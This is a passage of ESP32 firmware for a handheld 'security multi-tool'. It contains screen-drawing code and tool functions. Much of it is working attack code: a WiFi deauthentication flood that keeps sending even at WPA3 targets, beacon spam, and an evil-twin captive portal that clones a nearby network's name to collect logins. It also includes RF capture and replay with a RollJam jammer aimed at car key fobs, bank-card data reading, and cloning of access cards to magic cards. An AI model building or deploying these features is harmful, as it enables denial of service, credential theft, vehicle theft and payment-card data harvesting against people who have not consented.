void drawPlaceholder(const char* title, const char* msg) {
  display.clearBuffer(); drawHeader(title);
  drawMascot(104, 33, MOOD_THINKING);
  display.setFont(u8g2_font_6x10_tr); display.drawStr(8,34,msg);
  display.setFont(u8g2_font_5x8_tr); display.drawStr(8,48,"module planned");
  drawControls("bk:back"); display.sendBuffer();
}

void drawNFC() {
  display.clearBuffer();
  drawHeader("NFC Reader");
  if (!nfcReady) {
    display.setFont(u8g2_font_6x10_tr); display.drawStr(4,35,"PN532 not ready");
    display.setFont(u8g2_font_5x8_tr);  display.drawStr(4,50,"Check I2C 0x24");
    drawControls("bk:back"); display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  if (!nfcCard.valid) {
    drawMascot(104, 33, MOOD_THINKING);
    display.setFont(u8g2_font_6x10_tr); display.drawStr(4,28,"Hold card");
    display.drawStr(4,42,"near coil");
    drawLiveDots(8, 52);
  } else {
    display.setFont(u8g2_font_5x8_tr);
    // Card type (line 1)
    char line1[22];
    if (strlen(nfcCard.panMasked) > 0)
      snprintf(line1, sizeof(line1), "%.21s", nfcCard.panMasked);
    else if (strlen(nfcCard.network) > 0)
      snprintf(line1, sizeof(line1), "%s", nfcCard.network);
    else
      snprintf(line1, sizeof(line1), "%s", nfcCard.type);
    drawMascot(108, 33, strlen(nfcCard.network) > 0 ? MOOD_SUCCESS : MOOD_HAPPY);
    display.drawStr(2, 25, line1);
    if (strlen(nfcCard.expiry) > 0) {
      char expLine[22]; snprintf(expLine, sizeof(expLine), "%s %.10s", nfcCard.expiry, nfcCard.network);
      display.drawStr(2, 35, expLine);
    } else if (strlen(nfcCard.network) > 0)
      display.drawStr(2, 35, nfcCard.type);
    else if (strlen(nfcCard.aid) > 0)
      display.drawStr(2, 35, nfcCard.aid);
    // Line 3: holder name or UID
    char uidLine[22];
    if (strlen(nfcCard.holder) > 0) snprintf(uidLine, sizeof(uidLine), "%.21s", nfcCard.holder);
    else snprintf(uidLine, sizeof(uidLine), "%.21s", nfcCard.uid);
    display.drawStr(2, 45, uidLine);
    // Line 4: ATC counter + tx log count
    if (nfcAtc[0] || nfcAtc[1] || nfcTxLogCount > 0) {
      char extra[22];
      uint16_t atcVal = ((uint16_t)nfcAtc[0] << 8) | nfcAtc[1];
      if (nfcTxLogCount > 0)
        snprintf(extra, sizeof(extra), "ATC:%u  %dtx in log", atcVal, nfcTxLogCount);
      else
        snprintf(extra, sizeof(extra), "ATC:%u uses", atcVal);
      display.drawStr(2, 55, extra);
    }
  }
  drawControls("ok:clear  bk:back");
  display.sendBuffer();
}

// ---- NFC sub-menu ----
void drawNfcMenu() {
  display.clearBuffer();
  drawHeader("NFC");
  display.setFont(u8g2_font_5x8_tr);
  const char* items[] = {"Read Bank Card", "Read Access Card", "Saved Cards"};
  for (int i = 0; i < 3; i++) {
    int y = 20 + i * 13;
    if (i == nfcMenuIdx) {
      display.drawBox(0, y - 8, 128, 10); display.setDrawColor(0);
    }
    display.drawStr(4, y, items[i]);
    if (i == nfcMenuIdx) display.setDrawColor(1);
  }
  drawMascot(104, 50, MOOD_THINKING);
  drawControls("ok:sel  bk:back");
  display.sendBuffer();
}

// ---- NFC Access (Mifare scan + emulate + write) ----
void drawNfcAccess() {
  display.clearBuffer();
  drawHeader("NFC Access");
  display.setFont(u8g2_font_5x8_tr);

  switch (nfcAccessPhase) {
    case NFC_ACC_SCANNING:
      drawMascot(104, 33, MOOD_THINKING);
      display.setFont(u8g2_font_6x10_tr);
      display.drawStr(4, 28, "Hold card near");
      display.drawStr(4, 42, "coil...");
      drawLiveDots(8, 55);
      drawControls("bk:back");
      break;

    case NFC_ACC_READY:
      drawMascot(104, 22, mifareCard.sectorsRead > 0 ? MOOD_SUCCESS : MOOD_HAPPY);
      display.drawStr(2, 20, mifareCard.uid);
      display.drawStr(2, 30, mifareStatus);
      display.setFont(u8g2_font_6x10_tr);
      display.drawStr(2, 44, mifareCard.sectorsRead > 0 ? "Dump ready" : "UID ready");
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(2, 56, "Access card");
      drawControls("bk:back");
      break;

    case NFC_ACC_EMULATING:
      drawMascot(104, 33, nfcEmulateGotHit ? MOOD_SUCCESS : MOOD_WORKING);
      display.setFont(u8g2_font_6x10_tr);
      if (nfcEmulateGotHit) {
        display.drawStr(4, 28, "Reader hit!");
        display.setFont(u8g2_font_5x8_tr);
        display.drawStr(2, 42, mifareCard.uid);
      } else {
        display.drawStr(4, 28, "Hold to reader");
        display.setFont(u8g2_font_5x8_tr);
        display.drawStr(2, 42, mifareCard.uid);
        drawLiveDots(8, 55);
      }
      drawControls("ok:write  bk:stop");
      break;

    case NFC_ACC_WRITE_CONFIRM:
      drawMascot(104, 22, MOOD_THINKING);
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(2, 20, "Magic card write");
      display.drawStr(2, 30, "Ready");
      display.drawStr(2, 40, mifareCard.uid);
      drawControls("ok:write  bk:cancel");
      break;

    case NFC_ACC_WRITING:
      drawMascot(104, 33, MOOD_WORKING);
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(2, 30, nfcWriteStatus);
      drawLiveDots(8, 45);
      drawControls("bk:cancel");
      break;

    case NFC_ACC_WRITE_DONE:
      drawMascot(104, 33, MOOD_SUCCESS);
      display.setFont(u8g2_font_6x10_tr);
      display.drawStr(4, 30, "Done!");
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(2, 44, nfcWriteStatus);
      drawControls("bk:back");
      break;

    case NFC_ACC_WRITE_FAIL:
      drawMascot(104, 33, MOOD_FAIL);
      display.setFont(u8g2_font_5x8_tr);
      display.drawStr(2, 35, nfcWriteStatus);
      drawControls("bk:back");
      break;
  }
  display.sendBuffer();
}

// ---- Saved cards list ----
void drawNfcSaved() {
  display.clearBuffer();
  drawHeader("Saved Cards");
  display.setFont(u8g2_font_5x8_tr);
  if (nfcSavedCount == 0) {
    display.drawStr(4, 35, "No saved cards");
    drawControls("bk:back");
    display.sendBuffer(); return;
  }
  for (int i = 0; i < 4 && (nfcSavedScroll + i) < nfcSavedCount; i++) {
    int idx = nfcSavedScroll + i;
    int y = 18 + i * 11;
    if (idx == nfcSavedIdx) {
      display.drawBox(0, y - 8, 128, 10); display.setDrawColor(0);
    }
    display.drawStr(4, y, nfcSavedLabels[idx]);
    if (idx == nfcSavedIdx) display.setDrawColor(1);
  }
  drawControls("ok:load  bk:back");
  display.sendBuffer();
}

void drawSubGhz() {
  display.clearBuffer();

  if (!cc1101Ok) {
    drawHeader("Sub-GHz");
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(4, 35, "CC1101 not found");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(4, 50, "Check wiring (GPIO15)");
    drawControls("bk:back");
    display.sendBuffer();
    return;
  }

  // Header: freq + live RSSI always visible
  display.setFont(u8g2_font_5x8_tr);
  int rssiNow = cc1101Ok ? ELECHOUSE_cc1101.getRssi() : -99;
  char hdr[32]; snprintf(hdr, sizeof(hdr), "%.2fMHz %.0fk %ddBm", sgActiveFreqMHz, SG_RX_BWS[sgActiveBwIdx], rssiNow);
  display.drawStr(2, 8, hdr);
  display.drawHLine(0, 10, 128);

  // ── STEP 1: IDLE — no capture, not armed ──────────────────────────
  if (!sgCapture.valid && !sgArmed) {
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(2, 24, "STEP 1: Arm capture");
    display.setFont(u8g2_font_5x8_tr);
    // Live RSSI bar
    int barW = map(constrain(rssiNow, -100, -20), -100, -20, 0, 120);
    display.drawFrame(4, 27, 120, 6);
    if (barW > 0) display.drawBox(4, 27, barW, 6);
    char floorLine[28]; snprintf(floorLine, sizeof(floorLine), "Floor:%ddBm", sgNoiseFloor);
    display.drawStr(2, 43, floorLine);
    if (sgSessionTarget > 0) {
      char sess[32]; snprintf(sess, sizeof(sess), "Session %u/%u — press fob", sgSessionCount+1, sgSessionTarget);
      display.drawStr(2, 53, sess);
    } else {
      display.drawStr(2, 53, "OK/DN arm  UP classify");
    }
    drawControls("ok/dn arm  f scan  u tune");

  // ── STEP 1b: ARMED — waiting for signal ───────────────────────────
  } else if (!sgCapture.valid && sgArmed) {
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(2, 24, ">>> ARMED <<<");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(2, 36, "Press remote NOW");
    // RSSI bar shows live activity while waiting
    int barW = map(constrain(rssiNow, -100, -20), -100, -20, 0, 120);
    display.drawFrame(4, 39, 120, 6);
    if (barW > 0) display.drawBox(4, 39, barW, 6);
    char floorLine[28]; snprintf(floorLine, sizeof(floorLine), "Floor:%d  Now:%d", sgNoiseFloor, rssiNow);
    display.drawStr(2, 53, floorLine);
    drawControls("dn:cancel  bk:exit");

  // ── STEP 3: AWAITING REPLAY RESULT ────────────────────────────────
  } else if (sgCapture.valid && sgAwaitReplayResult) {
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(2, 22, "STEP 3: Result?");
    display.setFont(u8g2_font_5x8_tr);
    char capInfo[32]; snprintf(capInfo, sizeof(capInfo), "Replayed: %de %.2fMHz %s",
                               sgPulseCount, sgActiveFreqMHz, sgLoadedFromSd ? "SD" : "LIVE");
    display.drawStr(2, 33, capInfo);
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(2, 46, "Did target react?");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(2, 55, "UP:YES   DN:NO   i:partial");
    drawControls("up:yes  dn:no  i:partial");

  // ── STEP 2: CAPTURE READY ─────────────────────────────────────────
  } else if (sgCapture.valid) {
    display.setFont(u8g2_font_5x8_tr);
    // Line 1: capture summary
    char capLine[32]; snprintf(capLine, sizeof(capLine), "CAPTURED %de %s %.2fMHz",
                               sgPulseCount, sgLoadedFromSd ? "SD" : "LIVE", sgActiveFreqMHz);
    display.drawStr(2, 20, capLine);

    // Line 2: protocol or verdict
    if (sgLastSimilarityPct >= 0) {
      const char* verdict = sgLastSimilarityPct >= 85 ? "FIXED" :
                            sgLastSimilarityPct >= 50 ? "UNCERTAIN" : "ROLLING?";
      char simLine[28]; snprintf(simLine, sizeof(simLine), "%s sim:%d%% step2=classify", verdict, sgLastSimilarityPct);
      display.drawStr(2, 30, simLine);
    } else if (strcmp(sgDecodedProtocol, "unknown") != 0) {
      char decLine[30]; snprintf(decLine, sizeof(decLine), "%.28s", sgDecodedBits);
      display.drawStr(2, 30, decLine);
    } else {
      display.drawStr(2, 30, "RAW OOK — press OK/UP replay");
    }

    // Line 3: next step hint
    if (sgNeedSecondCapture) {
      display.drawStr(2, 41, "STEP 2: OK=capture p2  UP=replay");
    } else {
      display.drawStr(2, 41, "STEP 2: OK/UP replay  DN clear");
    }

    // Waveform thumbnail
    if (sgWaveReady) {
      int waveY = 53;
      display.drawHLine(2, waveY, 124);
      for (int i = 0; i < min(sgPulseCount, 124); i++) {
        if (sgWave[i]) display.drawVLine(2 + i, waveY - 7, 7);
      }
    }
    drawControls(sgNeedSecondCapture ? "ok:p2 up:replay1 dn:clear bk:exit"
                                     : "ok/up:replay dn:clear bk:exit");
  }
  display.sendBuffer();
}

void drawSubGhzPicker() {
  display.clearBuffer();
  drawHeader("RF Captures");
  display.setFont(u8g2_font_5x8_tr);
  if (sgPickerCount <= 0) {
    display.drawStr(4, 32, "No captures on SD");
    drawControls("bk:back");
    display.sendBuffer();
    return;
  }

  for (int row = 0; row < 4; row++) {
    int idx = sgPickerScroll + row;
    if (idx >= sgPickerCount) break;
    int y = 18 + row * 10;
    if (idx == sgPickerIdx) {
      display.drawBox(0, y - 8, 128, 9);
      display.setDrawColor(0);
    }
    char line[28];
    snprintf(line, sizeof(line), "%02d %.22s", idx + 1, sgPickerNames[idx]);
    display.drawStr(2, y, line);
    if (idx == sgPickerIdx) display.setDrawColor(1);
  }
  drawScrollBar(sgPickerScroll, sgPickerCount, 4);
  drawControls("up/dn pick ok load bk");
  display.sendBuffer();
}

void drawSubGhzFreqScan() {
  display.clearBuffer();
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(2, 8, "Freq Scanner — HOLD button");
  display.drawHLine(0, 10, 128);

  // Find max edges for bar scaling
  int maxEdges = 1;
  for (int i = 0; i < SG_SCAN_NFREQS; i++)
    if (sgFreqScanEdges[i] > maxEdges) maxEdges = sgFreqScanEdges[i];

  // 9 freqs, 3 cols × 3 rows. Available y: 11-55 = 44px → ~14px per row.
  // Each cell: freq label (6px) + edge bar (5px) + 3px gap = 14px.
  for (int i = 0; i < SG_SCAN_NFREQS; i++) {
    int col = i % 3;
    int row = i / 3;
    int x = col * 43;          // 3 cols, 43px wide each
    int y = 12 + row * 15;     // row starts: 12, 27, 42

    // Freq label — short names to fit 43px cell
    char lbl[8];
    float f = SG_SCAN_FREQS[i];
    if      (f < 301)  snprintf(lbl, sizeof(lbl), "300");
    else if (f < 310)  snprintf(lbl, sizeof(lbl), "303.9");
    else if (f < 320)  snprintf(lbl, sizeof(lbl), "315");
    else if (f < 335)  snprintf(lbl, sizeof(lbl), "330");
    else if (f < 360)  snprintf(lbl, sizeof(lbl), "345");
    else if (f < 420)  snprintf(lbl, sizeof(lbl), "390");
    else if (f < 500)  snprintf(lbl, sizeof(lbl), "433");
    else if (f < 900)  snprintf(lbl, sizeof(lbl), "868");
    else               snprintf(lbl, sizeof(lbl), "915");

    // Highlight winner / current
    bool isCurrent = (i == sgFreqScanIdx);
    if (isCurrent) { display.drawBox(x, y - 6, 42, 7); display.setDrawColor(0); }
    display.drawStr(x + 1, y, lbl);
    if (isCurrent) display.setDrawColor(1);

    // Edge count bar (width 0-40 scaled to max seen)
    int barW = (sgFreqScanEdges[i] * 40) / maxEdges;
    display.drawFrame(x, y + 2, 40, 4);
    if (barW > 0) display.drawBox(x, y + 2, barW, 4);

    // Edge count number (tiny, right of bar if space)
    char eStr[6]; snprintf(eStr, sizeof(eStr), "%d", sgFreqScanEdges[i]);
    display.drawStr(x + 1, y + 13, eStr);
  }

  drawControls("ok:set freq  bk:back");
  display.sendBuffer();
}

void drawSubGhzRollJam() {
  display.clearBuffer();
  drawHeader("RollJam");
  display.setFont(u8g2_font_5x8_tr);

  const char* phaseStr =
    sgRJPhase == RJ_JAMMING_WAIT_P1 ? "JAMMING — press fob" :
    sgRJPhase == RJ_STOP_JAM_REPLAY_P1 ? "Replaying P1..." :
    sgRJPhase == RJ_WAIT_P2           ? "Waiting P2..." :
    sgRJPhase == RJ_COMPLETE          ? "P2 held — replay!" :
    "Idle";

  display.drawStr(2, 20, phaseStr);

  char jamLine[28];
  snprintf(jamLine, sizeof(jamLine), "Jammer: %s @433.80MHz",
           cc1101JamOk ? (sgRJPhase == RJ_JAMMING_WAIT_P1 ? "ON" : "OFF") : "N/A");
  display.drawStr(2, 32, jamLine);

  if (sgRJPhase == RJ_COMPLETE) {
    char p2Line[28];
    snprintf(p2Line, sizeof(p2Line), "P2 edges=%d RSSI=%d", sgPulseCount, sgCaptureRssi);
    display.drawStr(2, 42, p2Line);
    display.drawStr(2, 52, "OK replay P2  bk exit");
  } else if (sgRJPhase == RJ_JAMMING_WAIT_P1) {
    char rjLine[28];
    snprintf(rjLine, sizeof(rjLine), "Jammed: car deaf");
    display.drawStr(2, 42, rjLine);
    display.drawStr(2, 52, "bk abort");
  }

  drawMascot(100, 40, sgRJPhase == RJ_COMPLETE ? MOOD_SUCCESS :
             sgRJPhase == RJ_JAMMING_WAIT_P1 ? MOOD_ANGRY : MOOD_WORKING);
  display.sendBuffer();
}

void drawAbout() {
  display.clearBuffer();
  drawHeader("Mascot");
  mascotVisualAllowed = true;
  drawMascot(104, 30, reactionMood);
  mascotVisualAllowed = false;
  display.setFont(u8g2_font_6x10_tr);
  display.drawStr(2, 25, "VariOne " FW_VERSION);
  display.drawStr(2, 37, "Security");
  display.drawStr(2, 49, "Multi-Tool");
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(2, 60, "CIC Cairo");
  display.sendBuffer();
}

// ============================================================
// TOOL FUNCTIONS
// ============================================================

void runWifiScan() {
  currentState = STATE_WIFI_SCAN;
  DBG_PRINTLN("[WIFI-SCAN] start");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  WiFi.scanNetworks(true); // async — returns immediately, we animate while waiting

  unsigned long scanStart = millis();
  while (WiFi.scanComplete() < 0) {
    display.clearBuffer();
    drawMascot(22, 28, MOOD_WAVING);
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(4, 22, "Scanning");
    display.drawStr(4, 34, "WiFi...");
    // Animated dots
    int dots = (millis() / 400) % 4;
    char d[5] = "    ";
    for (int i = 0; i < dots; i++) d[i] = '.';
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(4, 48, d);
    display.sendBuffer();

    // Cancel on any button press or 'q' serial
    char input = readButtons();
    if (!input && Serial.available()) input = Serial.read();
    if (input == 'q' || input == 'e') {
      WiFi.scanDelete();
      WiFi.mode(WIFI_OFF);
      triggerReaction(MOOD_SAD, "Scan stopped", "going back");
      currentState = STATE_WIFI_MENU;
      return;
    }

    delay(50); // ~20fps

    if (millis() - scanStart > 10000) break; // 10s timeout safety
  }

  int found = WiFi.scanComplete();
  if (found < 0) found = 0;

  wifiCount = min(found, 20);
  for (int i=0;i<wifiCount;i++) {
    wifiNets[i].ssid=WiFi.SSID(i); wifiNets[i].rssi=WiFi.RSSI(i);
    wifiNets[i].encryption=WiFi.encryptionType(i); wifiNets[i].channel=WiFi.channel(i);
    memcpy(wifiNets[i].bssid,WiFi.BSSID(i),6);
  }
  for (int i=0;i<wifiCount-1;i++)
    for (int j=i+1;j<wifiCount;j++)
      if(wifiNets[j].rssi>wifiNets[i].rssi) { WifiNetwork tmp=wifiNets[i]; wifiNets[i]=wifiNets[j]; wifiNets[j]=tmp; }
  wifiScroll=0; WiFi.scanDelete(); WiFi.mode(WIFI_OFF);
  Serial.printf("[WIFI-SCAN] found %d AP(s)\n", wifiCount);
  for (int i = 0; i < wifiCount; i++) {
    char bssid[18]; macToString(wifiNets[i].bssid, bssid, sizeof(bssid));
    Serial.printf("[WIFI-SCAN] #%02d ssid=\"%s\" bssid=%s rssi=%d ch=%d enc=%d\n",
                  i + 1, wifiNets[i].ssid.c_str(), bssid, wifiNets[i].rssi,
                  wifiNets[i].channel, wifiNets[i].encryption);
  }
  saveWifiScanCapture();

  if (wifiCount > 0) {
    char msg[22]; snprintf(msg, sizeof(msg), "Found %d APs!", wifiCount);
    triggerReaction(MOOD_HAPPY, msg, "scan complete");
  } else {
    triggerReaction(MOOD_SAD, "No networks", "try again?");
  }
  currentState = STATE_WIFI_RESULTS;
}

void startPacketMonitor() {
  DBG_PRINTLN("[PKTMON] start");
  memset((void*)channelPackets,0,sizeof(channelPackets));
  memset(channelPeaks,0,sizeof(channelPeaks));
  totalPackets=0; currentChannel=1; monitorActive=true;
  startPromiscuous(packetMonitorCB);
  esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
  lastChannelHop=millis(); currentState=STATE_PACKET_MONITOR;
  triggerReaction(MOOD_WORKING, "Monitoring", "all channels");
}
void stopPacketMonitor() { DBG_PRINTF("[PKTMON] stop packets=%d\n", totalPackets); monitorActive=false; stopPromiscuous(); currentState=STATE_WIFI_MENU; }

void startProbeSniffer() {
  DBG_PRINTLN("[PROBE] start");
  probeCount=0; probeScroll=0; probeActive=true;
  startPromiscuous(probeCB);
  esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
  currentState=STATE_PROBE_SNIFF;
  triggerReaction(MOOD_THINKING, "Sniffing...", "listening");
}
void stopProbeSniffer() { DBG_PRINTF("[PROBE] stop found=%d\n", probeCount); probeActive=false; stopPromiscuous(); currentState=STATE_WIFI_MENU; }

void startDeauthDetector() {
  DBG_PRINTLN("[DEAUTH-DETECT] start");
  deauthCount=0; totalMonitored=0; deauthStart=millis(); deauthActive=true;
  memset(deauthHistory,0,sizeof(deauthHistory)); deauthHistIdx=0;
  startPromiscuous(deauthCB);
  esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
  currentState=STATE_DEAUTH_DETECT;
  triggerReaction(MOOD_THINKING, "Watching", "deauth frames");
}
void stopDeauthDetector() { DBG_PRINTF("[DEAUTH-DETECT] stop alerts=%d monitored=%d\n", deauthCount, totalMonitored); deauthActive=false; stopPromiscuous(); currentState=STATE_WIFI_MENU; }

void enterDeauthTargetSelect() {
  DBG_PRINTF("[DEAUTH] target select wifiCount=%d\n", wifiCount);
  deauthTargetIdx=0; deauthTargetScroll=0; currentState=STATE_DEAUTH_TARGET;
  triggerReaction(MOOD_THINKING, "Pick target", "authorized AP");
}

void enterPortalDeauthFlow() {
  deauthTargetIdx = etTargetIdx;
  deauthTargetScroll = max(0, deauthTargetIdx - 2);
  Serial.printf("[DEAUTH] co-op flow using VariPortal target idx=%d\n", deauthTargetIdx);
  startClientScan();
}

void startClientScan() {
  char bssid[18]; macToString(wifiNets[deauthTargetIdx].bssid, bssid, sizeof(bssid));
  DBG_PRINTF("[CLIENT-SCAN] start ssid=\"%s\" bssid=%s ch=%d\n",
             wifiNets[deauthTargetIdx].ssid.c_str(), bssid, wifiNets[deauthTargetIdx].channel);
  clientCount=0; memset(clients,0,sizeof(clients));
  clientScanActive=true; clientScanStart=millis();
  startPromiscuous(clientScanCB);
  esp_wifi_set_channel(wifiNets[deauthTargetIdx].channel,WIFI_SECOND_CHAN_NONE);
  currentState=STATE_DEAUTH_CLIENT_SCAN;
  triggerReaction(MOOD_THINKING, "Finding", "clients...");
}

void finishClientScan() {
  clientScanActive=false;
  esp_wifi_set_promiscuous(false);
  if (!etActive) WiFi.mode(WIFI_OFF);
  else esp_wifi_set_channel(wifiNets[deauthTargetIdx].channel,WIFI_SECOND_CHAN_NONE);
  // sort by RSSI descending (closest first)
  for (int i=0;i<clientCount-1;i++)
    for (int j=i+1;j<clientCount;j++)
      if(clients[j].rssi>clients[i].rssi) { ClientMAC tmp=clients[i]; clients[i]=clients[j]; clients[j]=tmp; }
  clientSelectIdx=0; clientSelectScroll=0;
  currentState=STATE_DEAUTH_CLIENT_SELECT;
  Serial.printf("[CLIENT-SCAN] found %d client(s)\n", clientCount);
  for (int i = 0; i < clientCount; i++) {
    Serial.printf("[CLIENT-SCAN] #%02d mac=%02X:%02X:%02X:%02X:%02X:%02X\n",
                  i + 1, clients[i].mac[0], clients[i].mac[1], clients[i].mac[2],
                  clients[i].mac[3], clients[i].mac[4], clients[i].mac[5]);
  }
  saveWifiClientScanCapture();
  if (clientCount > 0) {
    char msg[22]; snprintf(msg, sizeof(msg), "Found %d client(s)", clientCount);
    triggerReaction(MOOD_HAPPY, msg, "pick a target");
  } else {
    triggerReaction(MOOD_SAD, "No clients", "scan again");
  }
}

void deauthTask(void*) {
  static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  while (deauthAttackActive) {
    for (int burst = 0; burst < DEAUTH_FRAMES_PER_TICK && deauthAttackActive; burst++) {
      const uint8_t* dest = attackClientMAC;
      if (attackMode == DEAUTH_MODE_BROADCAST) {
        dest = broadcast;
      } else if (attackMode == DEAUTH_MODE_ALL_DISCOVERED) {
        if (clientCount <= 0) { deauthAttackActive = false; break; }
        dest = clients[attackClientIdx].mac;
        attackClientIdx = (attackClientIdx + 1) % clientCount;
      }
      int prevOk = deauthTxOk, prevFail = deauthTxFail;
      sendDeauthFrame(wifiNets[deauthTargetIdx].bssid, dest);
      deauthFrameCount += (deauthTxOk - prevOk) + (deauthTxFail - prevFail);
      vTaskDelay(pdMS_TO_TICKS(1));
    }
    vTaskDelay(pdMS_TO_TICKS(DEAUTH_SEND_INTERVAL_MS));
  }
  deauthTaskHandle = nullptr;
  vTaskDelete(nullptr);
}

void prepareDeauthAttackConfirm() {
  if (clientSelectIdx == 0) attackMode = DEAUTH_MODE_BROADCAST;
  else if (clientSelectIdx == 1) attackMode = DEAUTH_MODE_ALL_DISCOVERED;
  else attackMode = DEAUTH_MODE_SINGLE;
  if (attackMode == DEAUTH_MODE_ALL_DISCOVERED && clientCount <= 0) {
    Serial.println("[DEAUTH] Rejected: all-discovered needs clients");
    triggerReaction(MOOD_FAIL, "No clients", "use broadcast");
    currentState = STATE_DEAUTH_CLIENT_SELECT;
    return;
  }
  if(attackMode == DEAUTH_MODE_SINGLE) memcpy(attackClientMAC,clients[clientSelectIdx-2].mac,6);
  deauthConfirmHoldStart = 0;
  currentState = STATE_DEAUTH_CONFIRM;
  triggerReaction(MOOD_ANGRY, "Confirm", "hold OK");
}

void startDeauthAttack() {
  deauthFrameCount=0; deauthTxOk=0; deauthTxFail=0; deauthLastTxErr=ESP_OK; deauthTxErrLogCount=0;
  deauthAttackActive=true; deauthAttackStart=millis(); attackClientIdx=0;
  deauthReturnToPortal = etActive;
  int targetCh=wifiNets[deauthTargetIdx].channel;
  char bssid[18]; macToString(wifiNets[deauthTargetIdx].bssid, bssid, sizeof(bssid));
  if (attackMode == DEAUTH_MODE_BROADCAST) {
    Serial.printf("[DEAUTH] start ssid=\"%s\" bssid=%s ch=%d mode=broadcast\n",
                  wifiNets[deauthTargetIdx].ssid.c_str(), bssid, targetCh);
  } else if (attackMode == DEAUTH_MODE_ALL_DISCOVERED) {
    Serial.printf("[DEAUTH] start ssid=\"%s\" bssid=%s ch=%d mode=all-found targets=%d\n",
                  wifiNets[deauthTargetIdx].ssid.c_str(), bssid, targetCh, clientCount);
  } else {
    Serial.printf("[DEAUTH] start ssid=\"%s\" bssid=%s ch=%d mode=single target=%02X:%02X:%02X:%02X:%02X:%02X\n",
                  wifiNets[deauthTargetIdx].ssid.c_str(), bssid, targetCh,
                  attackClientMAC[0], attackClientMAC[1], attackClientMAC[2],
                  attackClientMAC[3], attackClientMAC[4], attackClientMAC[5]);
  }
  // W7: warn on WPA3 — PMF mandatory, deauth frames ignored by protected clients
  int enc = wifiNets[deauthTargetIdx].encryption;
  if (enc == WIFI_AUTH_WPA3_PSK || enc == 7 /*WIFI_AUTH_WPA2_WPA3_PSK*/) {
    Serial.println("[DEAUTH] WARNING: WPA3 target — PMF mandatory — deauth ineffective against protected clients. Continuing anyway.");
    triggerReaction(MOOD_SAD, "WPA3 target", "PMF immune");
    delay(1500);
    triggerReaction(MOOD_ANGRY, "DEAUTH!", "sending anyway");
  }
  // W3: no dummy SoftAP when portal not active — use STA mode for injection
  esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous_rx_cb(nullptr);
  if (!etActive) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
  } else {
    WiFi.mode(WIFI_AP_STA);
  }
  esp_wifi_set_channel(targetCh,WIFI_SECOND_CHAN_NONE);
  currentState=STATE_DEAUTH_ATTACK;
  triggerReaction(MOOD_ANGRY, "DEAUTH!", "frames flying");
  // W1: pin deauth loop to Core 1, keep Core 0 free for portal + UI
  xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, nullptr, 1, &deauthTaskHandle, 1);
}
void stopDeauthAttack() {
  deauthAttackActive = false;
  // give task time to exit cleanly; force-delete if still running
  if (deauthTaskHandle != nullptr) {
    vTaskDelay(pdMS_TO_TICKS(60));
    if (deauthTaskHandle != nullptr) {
      vTaskDelete(deauthTaskHandle);
      deauthTaskHandle = nullptr;
    }
  }
  Serial.printf("[DEAUTH] stopped frames=%d tx_ok=%d tx_fail=%d mode=%s\n",
                deauthFrameCount, deauthTxOk, deauthTxFail, deauthModeName(attackMode));
  saveWifiDeauthSession();
  esp_wifi_set_promiscuous(false);
  if (etActive || deauthReturnToPortal) {
    deauthReturnToPortal = false;
    currentState = STATE_ET_RUNNING;
    drawEvilTwinRunning();
  } else {
    WiFi.mode(WIFI_OFF);
    currentState=STATE_WIFI_MENU;
  }
}

void startBeaconSpam() {
  DBG_PRINTLN("[BEACON] start");
  beaconFrameCount=0; beaconSSIDIdx=0; beaconChannelIdx=0;
  beaconSpamActive=true; lastBeaconSend=0;
  generateSpamMACs();
  WiFi.mode(WIFI_AP_STA); WiFi.softAP("v",nullptr,1,1); delay(100);
  esp_wifi_set_channel(beaconChannels[0],WIFI_SECOND_CHAN_NONE);
  currentState=STATE_BEACON_SPAM;
  triggerReaction(MOOD_HAPPY, "SSID Spam!", "20 SSIDs");
}
void stopBeaconSpam() {
  DBG_PRINTF("[BEACON] stop sent=%d\n", beaconFrameCount);
  beaconSpamActive=false; WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF); currentState=STATE_WIFI_MENU;
}

void enterEvilTwinTarget() {
  DBG_PRINTF("[VARIPORTAL] target select wifiCount=%d\n", wifiCount);
  etTargetIdx=0; etTargetScroll=0; currentState=STATE_ET_TARGET;
  triggerReaction(MOOD_THINKING, "Pick AP", "for portal");
}

void startEvilTwin() {
  logHeap("portal start before");
  etActive=true; etCredCount=0;
  memset(etLastUser,0,sizeof(etLastUser)); memset(etLastPass,0,sizeof(etLastPass));
  String ssid=wifiNets[etTargetIdx].ssid; if(!ssid.length()) ssid="FreeWiFi";
  int ch=wifiNets[etTargetIdx].channel;
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(192,168,4,1),IPAddress(192,168,4,1),IPAddress(255,255,255,0));
  WiFi.softAP(ssid.c_str(),nullptr,ch); delay(200);
  dnsServer.start(53,"*",IPAddress(192,168,4,1));
  etSetupWebServer();
  Serial.printf("[PORTAL] SSID=%s ch=%d IP=192.168.4.1 theme=%s\n",
                ssid.c_str(), ch, portalThemeName(portalThemeIdx));
  logHeap("portal start after");
  lastEtDraw=0; currentState=STATE_ET_RUNNING;
  triggerReaction(MOOD_WORKING, "Portal Demo", "portal up!");
}
void stopEvilTwin() {
  if (deauthAttackActive) {
    deauthAttackActive = false;
    esp_wifi_set_promiscuous(false);
